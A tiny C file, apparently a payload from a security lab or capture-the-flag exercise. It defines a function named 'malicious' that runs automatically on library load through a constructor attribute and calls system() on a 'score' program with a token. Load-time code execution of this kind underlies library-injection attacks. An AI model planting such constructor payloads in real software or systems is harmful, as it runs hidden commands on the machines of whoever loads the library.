#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score de1364a8-ee46-4cea-95d9-fedd543c87c0");
}
